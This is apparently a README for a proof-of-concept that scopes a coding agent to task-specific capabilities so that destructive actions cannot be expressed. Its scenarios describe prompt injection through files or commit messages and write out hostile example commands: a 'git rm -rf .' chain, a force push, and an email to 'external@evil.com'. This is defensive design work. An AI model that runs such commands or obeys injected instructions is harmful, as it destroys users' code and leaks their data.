# Copilot / Coding-Agent Governance via Rendered Capability Worlds

A practical Agent Hypervisor PoC for coding-agent workflows.

---

## What This PoC Demonstrates

A coding agent — Copilot-style or otherwise — that is given access to a
broad Git or shell surface can be manipulated into expressing destructive
actions: `git rm -rf .`, `git reset --hard`, `git push --force`, or
arbitrary `send_email` calls.

This PoC demonstrates that the right control point is not a deny rule at
execution time.  It is the **rendered capability world** the agent operates
in.

> **Permissions try to stop bad actions.**
> **Rendering removes them from the action space.**

The PoC does not try to make the agent behave better.
It changes what actions exist in the actor-visible world.

---

## Why This Matters for Coding Agents

A Copilot-style coding agent typically has access to:

- Full Git operations (add, commit, push, rm, reset, clean, force-push)
- Shell execution
- File system read/write

This is the **raw tool space** — what the system is technically capable of.
It is far broader than what any single task requires.

When an agent operates in the raw tool space:

- A malicious instruction in a file, commit message, or upstream agent
  output can propose `git rm -rf . && git commit -m "cleanup" && git push`
- A permission checker sees the tokens (`git`, `rm`) but not the semantics
  (`-rf .` meaning "delete everything")
- Allow/deny is the only control — and it operates too late, on actions
  that are already fully formed

When an agent operates in a **rendered capability world**:

- For a `code-update` task, the agent sees only: `stage_changes`,
  `commit_changes`, `push_changes`
- `destructive_delete` does not exist in this world
- There is no capability to invoke, no function to call, no string to pass
- The destructive action cannot be expressed — it is not expressible

---

## The Key Contrast

| Dimension              | Raw tool surface             | Rendered capability world       |
|------------------------|------------------------------|----------------------------------|
| What the agent sees    | All Git operations           | Task-scoped safe subset only     |
| Dangerous action       | Expressible, proposable      | Not expressible, not proposable  |
| Allow/deny decision    | Required for every action    | Not needed for absent actions    |
| Governance layer       | Primary control point        | Last-line check on safe set only |
| Attacker's goal        | Craft a string that passes   | There is no string to craft      |

---

## "Not Expressible" Is Stronger Than "Denied"

A denied action:

- Was proposed by the agent
- Reached the governance layer
- Was evaluated against policy
- Was rejected with a reason

A not-expressible action:

- Was never proposed
- Never reached governance
- Was never evaluated
- **Does not exist in this world**

The difference is architectural, not configurational.

A deny rule can be misconfigured, bypassed, or confused by a novel phrasing.
A missing capability cannot be invoked regardless of phrasing — because there
is no vocabulary for it.

This is the same principle behind capability-based security systems: you
cannot exercise a capability you do not hold.  Here it is applied to the
action vocabulary itself.

---

## Agent Hypervisor Layer Mapping

```
Layer 1  Base Ontology        (design-time)
         Constructs the safe capability vocabulary for each domain.
         Defines which capabilities CAN be rendered, ever.
         git_rm, git_reset, git_force_push have no ontology entry
         for coding-agent workflows — they cannot be rendered.

Layer 2  Dynamic Projection   (runtime)
         Selects the task-appropriate subset of the base ontology.
         For task=code-update: {stage_changes, commit_changes, push_changes}
         For task=release-safe: adds create_release_tag
         For task=reporting: {send_report_to_security, send_report_to_finance}

Layer 3  Execution Governance (runtime)
         Last-line policy + provenance check.
         Operates only on the already-rendered capability set.
         Most dangerous actions never reach this layer.
```

Layers 1 and 2 handle dangerous actions by **non-existence**.
Layer 3 handles edge cases and mixed-provenance situations within the
already-safe rendered world.

---

## Scenarios

### Scenario 1: `code-update`

**Rendered world:** `stage_changes`, `commit_changes`, `push_changes`

**Attempted action:** `git rm -rf . && git commit -m "cleanup" && git push`

**Semantic candidates:** `destructive_delete`, `commit_changes`, `push_changes`

**Result:** `NO MATCHING CAPABILITY`

`destructive_delete` has no entry in the rendered world.  The compound
action cannot proceed — one of its components does not exist.

---

### Scenario 2: `release-safe`

**Rendered world:** `stage_changes`, `commit_changes`, `push_changes`,
`create_release_tag`

**Attempted action:** `git push --force`

**Semantic candidates:** `force_push`

**Result:** `NO MATCHING CAPABILITY`

`force_push` is absent.  The release workflow is intentionally bounded:
it can tag and push normally, but history-rewriting is outside this world.

---

### Scenario 3: `reporting`

**Raw tool:** `send_email(to, body)` — arbitrary recipient

**Rendered world:** `send_report_to_security(body)`,
`send_report_to_finance(body)`

**Attempted action:** `send_email("external@evil.com", body)`

**Semantic candidates:** `send_email`

**Result:** `NO MATCHING CAPABILITY`

The generic `send_email` is not rendered.  Only purpose-bound,
pre-addressed forms are available.  Arbitrary recipient email cannot be
expressed.  The principle generalises beyond Git.

---

## Running the Demo

```bash
python examples/integrations/copilot_git_governance_demo.py
```

No external dependencies.  No LLM calls.  No subprocess execution.

## Running the Tests

```bash
pytest tests/test_copilot_git_governance_demo.py -v
```

---

## Relationship to Existing Demos

This PoC is a focused extension of the architectural ideas in:

- `examples/comparisons/capability_rendering_demo.py` — core rendering model
- `examples/comparisons/compare_bash_vs_rendering.py` — side-by-side contrast
- `docs/bash_vs_capability_rendering.md` — background analysis

The difference: this PoC is **scoped to coding-agent / Copilot-style
workflows** and adds the semantic action candidate layer — making the
matching step explicit and presentation-ready.

---

## Non-Goals

- This is not a GitHub Copilot extension or plugin
- This is not a production-ready policy editor
- This does not integrate with Copilot internals
- This does not claim to solve all coding-agent security problems

It is a sharp architectural PoC that demonstrates one claim:
**dangerous actions can be made non-expressible by world rendering,
before any deny rule is needed.**
